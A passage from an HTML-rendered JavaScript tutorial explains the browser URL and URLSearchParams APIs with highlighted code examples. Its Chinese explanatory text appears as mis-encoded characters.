<span class="token keyword">var</span> url2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span><span class="token string">'page2.html'</span><span class="token punctuation">,</span> <span class="token string">'http://example.com/page1.html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
url2<span class="token punctuation">.</span>href
<span class="token comment">// &quot;http://example.com/page2.html&quot;</span>

<span class="token keyword">var</span> url3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span><span class="token string">'..'</span><span class="token punctuation">,</span> <span class="token string">'http://example.com/a/b.html'</span><span class="token punctuation">)</span>
url3<span class="token punctuation">.</span>href
<span class="token comment">// &quot;http://example.com/&quot;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><p>ä¸Šé¢ä»£ç ä¸­ï¼Œè¿”å›çš„ URL å®ä¾‹çš„è·¯å¾„éƒ½æ˜¯åœ¨ç¬¬äºŒä¸ªå‚æ•°çš„åŸºç¡€ä¸Šï¼Œåˆ‡æ¢åˆ°ç¬¬ä¸€ä¸ªå‚æ•°å¾—åˆ°çš„ã€‚æœ€åä¸€ä¸ªä¾‹å­é‡Œé¢ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯<code>..</code>ï¼Œè¡¨ç¤ºä¸Šå±‚è·¯å¾„ã€‚</p> <h3 id="å®ä¾‹å±æ€§"><a href="#å®ä¾‹å±æ€§" class="header-anchor">#</a> å®ä¾‹å±æ€§</h3> <p>URL å®ä¾‹çš„å±æ€§ä¸<code>Location</code>å¯¹è±¡çš„å±æ€§åŸºæœ¬ä¸€è‡´ï¼Œè¿”å›å½“å‰ URL çš„ä¿¡æ¯ã€‚</p> <ul><li>URL.hrefï¼šè¿”å›æ•´ä¸ª URL</li> <li>URL.protocolï¼šè¿”å›åè®®ï¼Œä»¥å†’å·<code>:</code>ç»“å°¾</li> <li>URL.hostnameï¼šè¿”å›åŸŸå</li> <li>URL.hostï¼šè¿”å›åŸŸåä¸ç«¯å£ï¼ŒåŒ…å«<code>:</code>å·ï¼Œé»˜è®¤çš„80å’Œ443ç«¯å£ä¼šçœç•¥</li> <li>URL.portï¼šè¿”å›ç«¯å£</li> <li>URL.originï¼šè¿”å›åè®®ã€åŸŸåå’Œç«¯å£</li> <li>URL.pathnameï¼šè¿”å›è·¯å¾„ï¼Œä»¥æ–œæ <code>/</code>å¼€å¤´</li> <li>URL.searchï¼šè¿”å›æŸ¥è¯¢å­—ç¬¦ä¸²ï¼Œä»¥é—®å·<code>?</code>å¼€å¤´</li> <li>URL.searchParamsï¼šè¿”å›ä¸€ä¸ª<code>URLSearchParams</code>å®ä¾‹ï¼Œè¯¥å±æ€§æ˜¯<code>Location</code>å¯¹è±¡æ²¡æœ‰çš„</li> <li>URL.hashï¼šè¿”å›ç‰‡æ®µè¯†åˆ«ç¬¦ï¼Œä»¥äº•å·<code>#</code>å¼€å¤´</li> <li>URL.passwordï¼šè¿”å›åŸŸåå‰é¢çš„å¯†ç </li> <li>URL.usernameï¼šè¿”å›åŸŸåå‰é¢çš„ç”¨æˆ·å</li></ul> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span><span class="token string">'http://user:passwd@www.example.com:4097/path/a.html?x=111#part1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

url<span class="token punctuation">.</span>href
<span class="token comment">// &quot;http://user:passwd@www.example.com:4097/path/a.html?x=111#part1&quot;</span>
url<span class="token punctuation">.</span>protocol
<span class="token comment">// &quot;http:&quot;</span>
url<span class="token punctuation">.</span>hostname
<span class="token comment">// &quot;www.example.com&quot;</span>
url<span class="token punctuation">.</span>host
<span class="token comment">// &quot;www.example.com:4097&quot;</span>
url<span class="token punctuation">.</span>port
<span class="token comment">// &quot;4097&quot;</span>
url<span class="token punctuation">.</span>origin
<span class="token comment">// &quot;http://www.example.com:4097&quot;</span>
url<span class="token punctuation">.</span>pathname
<span class="token comment">// &quot;/path/a.html&quot;</span>
url<span class="token punctuation">.</span>search
<span class="token comment">// &quot;?x=111&quot;</span>
url<span class="token punctuation">.</span>searchParams
<span class="token comment">// URLSearchParams {}</span>
url<span class="token punctuation">.</span>hash
<span class="token comment">// &quot;#part1&quot;</span>
url<span class="token punctuation">.</span>password
<span class="token comment">// &quot;passwd&quot;</span>
url<span class="token punctuation">.</span>username
<span class="token comment">// &quot;user&quot;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br></div></div><p>è¿™äº›å±æ€§é‡Œé¢ï¼Œåªæœ‰<code>origin</code>å±æ€§æ˜¯åªè¯»çš„ï¼Œå…¶ä»–å±æ€§éƒ½å¯å†™ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span><span class="token string">'http://example.com/index.html#part1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

url<span class="token punctuation">.</span>pathname <span class="token operator">=</span> <span class="token string">'index2.html'</span><span class="token punctuation">;</span>
url<span class="token punctuation">.</span>href <span class="token comment">// &quot;http://example.com/index2.html#part1&quot;</span>

url<span class="token punctuation">.</span>hash <span class="token operator">=</span> <span class="token string">'#part2'</span><span class="token punctuation">;</span>
url<span class="token punctuation">.</span>href <span class="token comment">// &quot;http://example.com/index2.html#part2&quot;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p>ä¸Šé¢ä»£ç ä¸­ï¼Œæ”¹å˜ URL å®ä¾‹çš„<code>pathname</code>å±æ€§å’Œ<code>hash</code>å±æ€§ï¼Œéƒ½ä¼šå®æ—¶åæ˜ åœ¨ URL å®ä¾‹å½“ä¸­ã€‚</p> <h3 id="é™æ€æ–¹æ³•"><a href="#é™æ€æ–¹æ³•" class="header-anchor">#</a> é™æ€æ–¹æ³•</h3> <p><strong>ï¼ˆ1ï¼‰URL.createObjectURL()</strong></p> <p><code>URL.createObjectURL()</code>æ–¹æ³•ç”¨æ¥ä¸ºä¸Šä¼ /ä¸‹è½½çš„æ–‡ä»¶ã€æµåª’ä½“æ–‡ä»¶ç”Ÿæˆä¸€ä¸ª URL å­—ç¬¦ä¸²ã€‚è¿™ä¸ªå­—ç¬¦ä¸²ä»£è¡¨äº†<code>File</code>å¯¹è±¡æˆ–<code>Blob</code>å¯¹è±¡çš„ URLã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token comment">// HTML ä»£ç å¦‚ä¸‹</span>
<span class="token comment">// &lt;div id=&quot;display&quot;/&gt;</span>
<span class="token comment">// &lt;input</span>
<span class="token comment">//   type=&quot;file&quot;</span>
<span class="token comment">//   id=&quot;fileElem&quot;</span>
<span class="token comment">//   multiple</span>
<span class="token comment">//   accept=&quot;image/*&quot;</span>
<span class="token comment">//   onchange=&quot;handleFiles(this.files)&quot;</span>
<span class="token comment">//  &gt;</span>
<span class="token keyword">var</span> div <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'display'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">handleFiles</span><span class="token punctuation">(</span><span class="token parameter">files</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> files<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">var</span> img <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'img'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    img<span class="token punctuation">.</span>src <span class="token operator">=</span> window<span class="token punctuation">.</span><span class="token constant">URL</span><span class="token punctuation">.</span><span class="token function">createObjectURL</span><span class="token punctuation">(</span>files<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    div<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>img<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br></div></div><p>ä¸Šé¢ä»£ç ä¸­ï¼Œ<code>URL.createObjectURL()</code>æ–¹æ³•ç”¨æ¥ä¸ºä¸Šä¼ çš„æ–‡ä»¶ç”Ÿæˆä¸€ä¸ª URL å­—ç¬¦ä¸²ï¼Œä½œä¸º<code>&lt;img&gt;</code>å…ƒç´ çš„å›¾ç‰‡æ¥æºã€‚</p> <p>è¯¥æ–¹æ³•ç”Ÿæˆçš„ URL å°±åƒä¸‹é¢çš„æ ·å­ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>blob<span class="token operator">:</span>http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>localhost<span class="token operator">/</span>c745ef73<span class="token operator">-</span>ece9<span class="token operator">-</span><span class="token number">46</span>da<span class="token operator">-</span><span class="token number">8</span>f66<span class="token operator">-</span>ebes574789b1

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>æ³¨æ„ï¼Œæ¯æ¬¡ä½¿ç”¨<code>URL.createObjectURL()</code>æ–¹æ³•ï¼Œéƒ½ä¼šåœ¨å†…å­˜é‡Œé¢ç”Ÿæˆä¸€ä¸ª URL å®ä¾‹ã€‚å¦‚æœä¸å†éœ€è¦è¯¥æ–¹æ³•ç”Ÿæˆçš„ URL å­—ç¬¦ä¸²ï¼Œä¸ºäº†èŠ‚çœå†…å­˜ï¼Œå¯ä»¥ä½¿ç”¨<code>URL.revokeObjectURL()</code>æ–¹æ³•é‡Šæ”¾è¿™ä¸ªå®ä¾‹ã€‚</p> <p><strong>ï¼ˆ2ï¼‰URL.revokeObjectURL()</strong></p> <p><code>URL.revokeObjectURL()</code>æ–¹æ³•ç”¨æ¥é‡Šæ”¾<code>URL.createObjectURL()</code>æ–¹æ³•ç”Ÿæˆçš„ URL å®ä¾‹ã€‚å®ƒçš„å‚æ•°å°±æ˜¯<code>URL.createObjectURL()</code>æ–¹æ³•è¿”å›çš„ URL å­—ç¬¦ä¸²ã€‚</p> <p>ä¸‹é¢ä¸ºä¸Šä¸€æ®µçš„ç¤ºä¾‹åŠ ä¸Š<code>URL.revokeObjectURL()</code>ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> div <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'display'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">handleFiles</span><span class="token punctuation">(</span><span class="token parameter">files</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> files<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">var</span> img <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'img'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    img<span class="token punctuation">.</span>src <span class="token operator">=</span> window<span class="token punctuation">.</span><span class="token constant">URL</span><span class="token punctuation">.</span><span class="token function">createObjectURL</span><span class="token punctuation">(</span>files<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    div<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>img<span class="token punctuation">)</span><span class="token punctuation">;</span>
    img<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      window<span class="token punctuation">.</span><span class="token constant">URL</span><span class="token punctuation">.</span><span class="token function">revokeObjectURL</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>src<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><p>ä¸Šé¢ä»£ç ä¸­ï¼Œä¸€æ—¦å›¾ç‰‡åŠ è½½æˆåŠŸä»¥åï¼Œä¸ºæœ¬åœ°æ–‡ä»¶ç”Ÿæˆçš„ URL å­—ç¬¦ä¸²å°±æ²¡ç”¨äº†ï¼Œäºæ˜¯å¯ä»¥åœ¨<code>img.onload</code>å›è°ƒå‡½æ•°é‡Œé¢ï¼Œé€šè¿‡<code>URL.revokeObjectURL()</code>æ–¹æ³•å¸è½½è¿™ä¸ª URL å®ä¾‹ã€‚</p> <h2 id="_4-urlsearchparams-å¯¹è±¡"><a href="#_4-urlsearchparams-å¯¹è±¡" class="header-anchor">#</a> 4.URLSearchParams å¯¹è±¡</h2> <h3 id="æ¦‚è¿°-2"><a href="#æ¦‚è¿°-2" class="header-anchor">#</a> æ¦‚è¿°</h3> <p><code>URLSearchParams</code>å¯¹è±¡æ˜¯æµè§ˆå™¨çš„åŸç”Ÿå¯¹è±¡ï¼Œç”¨æ¥æ„é€ ã€è§£æå’Œå¤„ç† URL çš„æŸ¥è¯¢å­—ç¬¦ä¸²ï¼ˆå³ URL é—®å·åé¢çš„éƒ¨åˆ†ï¼‰ã€‚</p> <p>å®ƒæœ¬èº«ä¹Ÿæ˜¯ä¸€ä¸ªæ„é€ å‡½æ•°ï¼Œå¯ä»¥ç”Ÿæˆå®ä¾‹ã€‚å‚æ•°å¯ä»¥ä¸ºæŸ¥è¯¢å­—ç¬¦ä¸²ï¼Œèµ·é¦–çš„é—®å·<code>?</code>æœ‰æ²¡æœ‰éƒ½è¡Œï¼Œä¹Ÿå¯ä»¥æ˜¯å¯¹åº”æŸ¥è¯¢å­—ç¬¦ä¸²çš„æ•°ç»„æˆ–å¯¹è±¡ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token comment">// æ–¹æ³•ä¸€ï¼šä¼ å…¥å­—ç¬¦ä¸²</span>
<span class="token keyword">var</span> params <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span><span class="token string">'?foo=1&amp;bar=2'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// ç­‰åŒäº</span>
<span class="token keyword">var</span> params <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>location<span class="token punctuation">.</span>search<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// æ–¹æ³•äºŒï¼šä¼ å…¥æ•°ç»„</span>
<span class="token keyword">var</span> params <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">'foo'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'bar'</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// æ–¹æ³•ä¸‰ï¼šä¼ å…¥å¯¹è±¡</span>
<span class="token keyword">var</span> params <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'foo'</span> <span class="token operator">:</span> <span class="token number">1</span> <span class="token punctuation">,</span> <span class="token string">'bar'</span> <span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><p><code>URLSearchParams</code>ä¼šå¯¹æŸ¥è¯¢å­—ç¬¦ä¸²è‡ªåŠ¨ç¼–ç ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> params <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'foo'</span><span class="token operator">:</span> <span class="token string">'ä½ å¥½'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
params<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// &quot;foo=%E4%BD%A0%E5%A5%BD&quot;</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>ä¸Šé¢ä»£ç ä¸­ï¼Œ<code>foo</code>çš„å€¼æ˜¯æ±‰å­—ï¼Œ<code>URLSearchParams</code>å¯¹å…¶è‡ªåŠ¨è¿›è¡Œ URL ç¼–ç ã€‚</p> <p>æµè§ˆå™¨å‘æœåŠ¡å™¨å‘é€è¡¨å•æ•°æ®æ—¶ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨<code>URLSearchParams</code>å®ä¾‹ä½œä¸ºè¡¨å•æ•°æ®ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">const</span> params <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span><span class="token punctuation">{</span>foo<span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> bar<span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'https://example.com/api'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
  method<span class="token operator">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span>
  body<span class="token operator">:</span> params
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token operator">...</span><span class="token punctuation">)</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p>ä¸Šé¢ä»£ç ä¸­ï¼Œ<code>fetch</code>å‘½ä»¤å‘æœåŠ¡å™¨å‘é€å‘½ä»¤æ—¶ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨<code>URLSearchParams</code>å®ä¾‹ã€‚</p> <p><code>URLSearchParams</code>å¯ä»¥ä¸<code>URL</code>æ¥å£ç»“åˆä½¿ç”¨ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>location<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> foo <span class="token operator">=</span> url<span class="token punctuation">.</span>searchParams<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'foo'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token string">'somedefault'</span><span class="token punctuation">;</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>ä¸Šé¢ä»£ç ä¸­ï¼ŒURL å®ä¾‹çš„<code>searchParams</code>å±æ€§å°±æ˜¯ä¸€ä¸ª<code>URLSearchParams</code>å®ä¾‹ï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨<code>URLSearchParams</code>æ¥å£çš„<code>get</code>æ–¹æ³•ã€‚</p> <p><code>URLSearchParams</code>å®ä¾‹æœ‰éå†å™¨æ¥å£ï¼Œå¯ä»¥ç”¨<code>for...of</code>å¾ªç¯éå†ï¼ˆè¯¦è§ã€ŠES6 æ ‡å‡†å…¥é—¨ã€‹çš„ã€ŠIteratorã€‹ä¸€ç« ï¼‰ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> params <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'foo'</span><span class="token operator">:</span> <span class="token number">1</span> <span class="token punctuation">,</span> <span class="token string">'bar'</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> p <span class="token keyword">of</span> params<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>p<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">': '</span> <span class="token operator">+</span> p<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment">// foo: 1</span>
<span class="token comment">// bar: 2</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><p><code>URLSearchParams</code>æ²¡æœ‰å®ä¾‹å±æ€§ï¼Œåªæœ‰å®ä¾‹æ–¹æ³•ã€‚</p> <h3 id="urlsearchparams-tostring"><a href="#urlsearchparams-tostring" class="header-anchor">#</a> URLSearchParams.toString()</h3> <p><code>toString</code>æ–¹æ³•è¿”å›å®ä¾‹çš„å­—ç¬¦ä¸²å½¢å¼ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span><span class="token string">'https://example.com?foo=1&amp;bar=2'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> params <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span>url<span class="token punctuation">.</span>search<span class="token punctuation">)</span><span class="token punctuation">;</span>

params<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// &quot;foo=1&amp;bar=2'</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p>é‚£ä¹ˆéœ€è¦å­—ç¬¦ä¸²çš„åœºåˆï¼Œä¼šè‡ªåŠ¨è°ƒç”¨<code>toString</code>æ–¹æ³•ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> params <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span><span class="token punctuation">{</span>version<span class="token operator">:</span> <span class="token number">2.0</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href <span class="token operator">=</span> location<span class="token punctuation">.</span>pathname <span class="token operator">+</span> <span class="token string">'?'</span> <span class="token operator">+</span> params<span class="token punctuation">;</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>ä¸Šé¢ä»£ç ä¸­ï¼Œ<code>location.href</code>èµ‹å€¼æ—¶ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨<code>params</code>å¯¹è±¡ã€‚è¿™æ—¶å°±ä¼šè‡ªåŠ¨è°ƒç”¨<code>toString</code>æ–¹æ³•ã€‚</p> <h3 id="urlsearchparams-append"><a href="#urlsearchparams-append" class="header-anchor">#</a> URLSearchParams.append()</h3> <p><code>append()</code>æ–¹æ³•ç”¨æ¥è¿½åŠ ä¸€ä¸ªæŸ¥è¯¢å‚æ•°ã€‚å®ƒæ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªä¸ºé”®åï¼Œç¬¬äºŒä¸ªä¸ºé”®å€¼ï¼Œæ²¡æœ‰è¿”å›å€¼ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> params <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'foo'</span><span class="token operator">:</span> <span class="token number">1</span> <span class="token punctuation">,</span> <span class="token string">'bar'</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
params<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">'baz'</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
params<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// &quot;foo=1&amp;bar=2&amp;baz=3&quot;</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p><code>append()</code>æ–¹æ³•ä¸ä¼šè¯†åˆ«æ˜¯å¦é”®åå·²ç»å­˜åœ¨ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> params <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'foo'</span><span class="token operator">:</span> <span class="token number">1</span> <span class="token punctuation">,</span> <span class="token string">'bar'</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
params<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">'foo'</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
params<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// &quot;foo=1&amp;bar=2&amp;foo=3&quot;</span>

